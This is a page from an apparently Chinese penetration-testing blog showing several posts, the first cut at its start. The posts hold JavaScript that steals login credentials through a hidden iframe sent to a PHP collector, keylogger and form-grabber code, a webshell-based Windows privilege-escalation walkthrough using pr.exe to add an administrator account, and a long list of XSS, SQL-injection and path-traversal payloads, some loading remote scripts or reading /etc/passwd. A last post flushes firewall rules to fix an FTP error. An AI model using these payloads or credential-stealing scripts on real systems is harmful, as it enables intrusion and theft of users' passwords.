<p>这段代码用来截取用户在登录页面输入的用户名和密码信息，然后提交给当前创建的PHP脚本（<a href="http://127.0.0.1/phishing.php）。" target="_blank" rel="noopener">http://127.0.0.1/phishing.php）。</a></p>
<p>或者可以这样做：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">loginForm = document.forms[&apos; userslogin &apos;];</span><br><span class="line">function parseData()</span><br><span class="line">&#123;</span><br><span class="line">var user = loginForm.user.value;</span><br><span class="line">var pass = loginForm.pass.value;</span><br><span class="line">saveData(username,password);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">function saveData(username,password)</span><br><span class="line">&#123;</span><br><span class="line">var frame=document.createElement(&apos;iframe&apos;);       </span><br><span class="line">frame.src=&quot; http://127.0.0.1/phishing.php?user=&quot; + user + &quot;&amp;pass=&quot; + pass;</span><br><span class="line">frame.style.display=&apos;none&apos;;</span><br><span class="line">document.body.appendChild(frame);</span><br><span class="line">&#125;</span><br><span class="line">loginForm.onsubmit = parseData;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>如图2-21所示，在本地进行测试，用浏览器访问测试页面，然后输入一些信息并提交，处理程序便会获取和记录相关信息，如图2-22所示。</p>
<p>此外，攻击者还可以使用JavaScript编写键盘记录器。<br>假如要劫持链接的onclick事件，可以这样实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(i=0;i&lt;document.links.length;i++)&#123;</span><br><span class="line">document.links[i].onclick = hijack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>要监听键盘onkeydown事件，具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown=function(e)&#123;</span><br><span class="line">if(!e)e=window.event;</span><br><span class="line">try&#123;hijack();&#125;catch(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>下面这段代码则可以用于劫持表单的输入框，获取用户输入的用户名和密码信息，并记录下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.onkeyup=function()&#123;</span><br><span class="line">document.forms[&apos;PassFormlogin&apos;].onsubmit=function()&#123;</span><br><span class="line">   pwd = this.PassInputUsername0.value + &apos;|&apos; + this.PassInputPassword0.value;</span><br><span class="line">   log(escape(pwd));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此外，通过JavaScript可以遍历Form表单元素，从而抓取一些重要的字段值，下面是一个简单的POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function grabber()&#123;</span><br><span class="line"> F = document.forms;</span><br><span class="line"> for(var j=0; j&lt;F.length; ++j)</span><br><span class="line"> &#123;</span><br><span class="line">  f = F[j];</span><br><span class="line">  for (i=0; i&lt;f.length; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">   if (f[i].type.toLowerCase() == &quot;password&quot;)</span><br><span class="line">   &#123;</span><br><span class="line">    alert(&quot;Password:&quot;+f[i].value)</span><br><span class="line">   &#125;</span><br><span class="line">   else if (f[i].type.toLowerCase() != &quot;submit&quot;)</span><br><span class="line">   &#123;</span><br><span class="line">    alert(&quot;Text:&quot;+f[i].value)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> grabber();</span><br></pre></td></tr></table></figure></p>
<p>JavaScript键盘记录器还可以捕获用户按下的特定键，在IE浏览器中可以使用如下代码实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown() &#123;  </span><br><span class="line">　　 　　      var keycode = event.keyCode;  </span><br><span class="line">　　 　　      var realkey = String.fromCharCode(event.keyCode);  </span><br><span class="line">　　   　　     alert(&quot;按键码: &quot; + keycode + &quot; 字符: &quot; + realkey);  </span><br><span class="line">　　     &#125;  </span><br><span class="line">　　     document.onkeydown = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/03/17/PR提权/" title="渗透提权之PR提权" itemprop="url">渗透提权之PR提权</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-03-17T03:08:45.000Z" itemprop="datePublished"> 发表于 2017-03-17</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>提权当中最常用的要数PR提权了，但是前几天有个朋友问了我什么是PR提权，其实PR提权就是上传pr.exe 然后执行pr.exe”命令”。<br>解释再多也不如实际来操作演示一遍，刚好i春秋的一题渗透题目要用到PR提权，那就让我们一起看看吧</p>
<h3 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h3><p>当然是打开我们的大马了，这个大马虽然说界面不是很美，但是功能还是挺全的。大家将就用吧，哈哈</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/001.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><p>执行一下cmd（本来直接点击组件支持就可以了，也不知道是这个大马的原因还是我姿势不对，点击不了。。。。），随便执行一下cmd命令，发现提示如图所示：<br>（有可能组件被删，或者防火墙拦截，或者其他原因，咋们别管）</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/002.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><p>点击查看磁盘，找到可读可写磁盘，然后上传咋们自家的CMD,顺带把PR也一起上传上去吧</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/003.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h3><p>用我们上传的cmd来执行一下命令，发现是可执行的</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/004.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h3><p>直接添加一个用户，如图：没反应。（其实应该报错的，有的会报字符太长啥的，有可能这个大马有问题，别管他）</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/005.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="第六步："><a href="#第六步：" class="headerlink" title="第六步："></a>第六步：</h3><p>利用PR添加用户，如图：添加成功</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/006.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="第七步："><a href="#第七步：" class="headerlink" title="第七步："></a>第七步：</h3><p>把我们创建的用户添加到管理员组（这样干起事情来方便点）</p>
<p><img src="http://opgnaclz6.bkt.clouddn.com/007.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="最后一步："><a href="#最后一步：" class="headerlink" title="最后一步："></a>最后一步：</h3><p>你管理员权限都有了，想干嘛就干嘛呀 ←_←</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/02/24/XSS跨站测试代码大全/" title="XSS跨站测试代码大全" itemprop="url">XSS跨站测试代码大全</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-02-24T10:05:21.000Z" itemprop="datePublished"> 发表于 2017-02-24</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>收集了很多关于xss测试的代码，后期会不断更新</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string">='</span>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(<span class="string">'XSS'</span>)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;/script&gt;</span><br><span class="line">&lt;img src=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">%0a%0a&lt;script&gt;alert(\<span class="string">"Vulnerable\")&lt;/script&gt;.jsp</span></span><br><span class="line"><span class="string">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span></span><br><span class="line"><span class="string">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span></span><br><span class="line"><span class="string">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span></span><br><span class="line"><span class="string">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span></span><br><span class="line"><span class="string">%3f.jsp</span></span><br><span class="line"><span class="string">%3f.jsp</span></span><br><span class="line"><span class="string">&lt;script&gt;alert('Vulnerable');&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</span></span><br><span class="line"><span class="string">?sql_debug=1</span></span><br><span class="line"><span class="string">a%5c.aspx</span></span><br><span class="line"><span class="string">a.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</span></span><br><span class="line"><span class="string">a/</span></span><br><span class="line"><span class="string">a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</span></span><br><span class="line"><span class="string">"</span>&gt;&lt;script&gt;alert(<span class="string">'Vulnerable'</span>)&lt;/script&gt;</span><br><span class="line"><span class="string">';exec%20master..xp_cmdshell%20'</span>dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt<span class="string">'--&amp;&amp;</span></span><br><span class="line"><span class="string">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span></span><br><span class="line"><span class="string">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span></span><br><span class="line"><span class="string">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span></span><br><span class="line"><span class="string">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span></span><br><span class="line"><span class="string">http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd</span></span><br><span class="line"><span class="string">..\..\..\..\..\..\..\..\windows\system.ini</span></span><br><span class="line"><span class="string">\..\..\..\..\..\..\..\..\windows\system.ini</span></span><br><span class="line"><span class="string">'</span><span class="string">';!--"&lt;XSS&gt;=&amp;&#123;()&#125;</span></span><br><span class="line"><span class="string">&lt;IMG src="javascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=javascript:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=JaVaScRiPt:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=JaVaScRiPt:alert("XSS")&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=javascript:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=javascript:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src="jav ascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src="jav ascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">&lt;IMG src="jav ascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">"&lt;IMG src=java\0script:alert(\"XSS\")&gt;";'</span> &gt; out</span><br><span class="line">&lt;IMG src=<span class="string">" javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY BACKGROUND=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(<span class="string">'XSS'</span>)&gt;</span><br><span class="line">&lt;IMG DYNSRC=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;IMG LOWSRC=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;BGSOUND src=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;br size=<span class="string">"&amp;&#123;alert('XSS')&#125;"</span>&gt;</span><br><span class="line">&lt;LAYER src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/layer&gt;</span><br><span class="line">&lt;LINK REL=<span class="string">"stylesheet"</span> href=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;IMG src=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span><br><span class="line">&lt;IMG src=<span class="string">"mocha:[code]"</span>&gt;</span><br><span class="line">&lt;IMG src=<span class="string">"livescript:[code]"</span>&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span><br><span class="line">&lt;IFRAME src=javascript:alert(<span class="string">'XSS'</span>)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(<span class="string">'XSS'</span>)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br><span class="line">&lt;DIV STYLE=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span><br><span class="line">&lt;DIV STYLE=<span class="string">"behaviour: url('http://www.how-to-hack.org/exploit.html');"</span>&gt;</span><br><span class="line">&lt;DIV STYLE=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port<span class="string">'\ja\vasc\ript:alert("XSS")'</span>;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=<span class="string">'xss:expre\ssion(alert("XSS"))'</span>&gt;</span><br><span class="line">&lt;STYLE TYPE=<span class="string">"text/javascript"</span>&gt;alert(<span class="string">'XSS'</span>);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE TYPE=<span class="string">"text/css"</span>&gt;.XSS&#123;background-image:url(<span class="string">"javascript:alert('XSS')"</span>);&#125;&lt;/STYLE&gt;&lt;A class=<span class="string">"XSS"</span>&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;BODY&#123;background:url(<span class="string">"javascript:alert('XSS')"</span>)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE href=<span class="string">"javascript:alert('XSS');//"</span>&gt;</span><br><span class="line">getURL(<span class="string">"javascript:alert('XSS')"</span>)</span><br><span class="line">a=<span class="string">"get"</span>;b=<span class="string">"URL"</span>;c=<span class="string">"javascript:"</span>;d=<span class="string">"alert('XSS');"</span>;<span class="built_in">eval</span>(a+b+c+d);</span><br><span class="line">&lt;XML src=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br><span class="line"><span class="string">"&gt; &lt;BODY ONLOAD="</span>a();<span class="string">"&gt;&lt;SCRIPT&gt;function a()&#123;alert('XSS');&#125;&lt;/SCRIPT&gt;&lt;"</span></span><br><span class="line">&lt;SCRIPT src=<span class="string">"http://xss.ha.ckers.org/xss.jpg"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG src=<span class="string">"javascript:alert('XSS')"</span></span><br><span class="line">&lt;!--<span class="comment">#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt;</span></span><br><span class="line">&lt;IMG src=<span class="string">"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"</span>&gt;</span><br><span class="line">&lt;SCRIPT a=<span class="string">"&gt;"</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =<span class="string">"&gt;"</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=<span class="string">"&gt;"</span> <span class="string">''</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT <span class="string">"a='&gt;'"</span> src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(<span class="string">"&lt;SCRI"</span>);&lt;/SCRIPT&gt;PT src=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br><span class="line">admin<span class="string">'--</span></span><br><span class="line"><span class="string">'</span> or 0=0 --</span><br><span class="line"><span class="string">" or 0=0 --</span></span><br><span class="line"><span class="string">or 0=0 --</span></span><br><span class="line"><span class="string">' or 0=0 #</span></span><br><span class="line"><span class="string">"</span> or 0=0 <span class="comment">#</span></span><br><span class="line">or 0=0 <span class="comment">#</span></span><br><span class="line"><span class="string">' or '</span>x<span class="string">'='</span>x</span><br><span class="line"><span class="string">" or "</span>x<span class="string">"="</span>x</span><br><span class="line"><span class="string">') or ('</span>x<span class="string">'='</span>x</span><br><span class="line"><span class="string">' or 1=1--</span></span><br><span class="line"><span class="string">" or 1=1--</span></span><br><span class="line"><span class="string">or 1=1--</span></span><br><span class="line"><span class="string">'</span> or a=a--</span><br><span class="line"><span class="string">" or "</span>a<span class="string">"="</span>a</span><br><span class="line"><span class="string">') or ('</span>a<span class="string">'='</span>a</span><br><span class="line"><span class="string">") or ("</span>a<span class="string">"="</span>a</span><br><span class="line">hi<span class="string">" or "</span>a<span class="string">"="</span>a</span><br><span class="line">hi<span class="string">" or 1=1 --</span></span><br><span class="line"><span class="string">hi' or 1=1 --</span></span><br><span class="line"><span class="string">hi' or 'a'='a</span></span><br><span class="line"><span class="string">hi') or ('a'='a</span></span><br><span class="line"><span class="string">hi"</span>) or (<span class="string">"a"</span>=<span class="string">"a[/code]</span></span><br></pre></td></tr></table></figure>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/09/06/FTP错误No-route-to-host-解决办法/" title="FTP错误No route to host 解决办法" itemprop="url">FTP错误No route to host 解决办法</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-09-06T03:28:04.000Z" itemprop="datePublished"> 发表于 2016-09-06</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>做渗透测写了一个程序获取靶机版本信息，连接新建的靶机FTP服务器时出现No route to host</p>
<h2 id="如图："><a href="#如图：" class="headerlink" title="如图："></a>如图：</h2><p><img src="http://opgnaclz6.bkt.clouddn.com/0as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>这种问题一般都是防火墙问题，有可能屏蔽的FTP服务器。</p>
<h2 id="1-检查防火墙"><a href="#1-检查防火墙" class="headerlink" title="1,检查防火墙:"></a>1,检查防火墙:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/1as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h2 id="2-清空防火墙："><a href="#2-清空防火墙：" class="headerlink" title="2,清空防火墙："></a>2,清空防火墙：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/2as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h2 id="3-保存更改的防火墙规则："><a href="#3-保存更改的防火墙规则：" class="headerlink" title="3,保存更改的防火墙规则："></a>3,保存更改的防火墙规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/3as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h2 id="4-解决成功，如图："><a href="#4-解决成功，如图：" class="headerlink" title="4,解决成功，如图："></a>4,解决成功，如图：</h2><p><img src="http://opgnaclz6.bkt.clouddn.com/4as%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/工具/">工具</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <a class="extend prev" rel="prev" href="/page/2/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  


  
<div class="category-block">
  <h3 class="asidetitle">分类</h3>
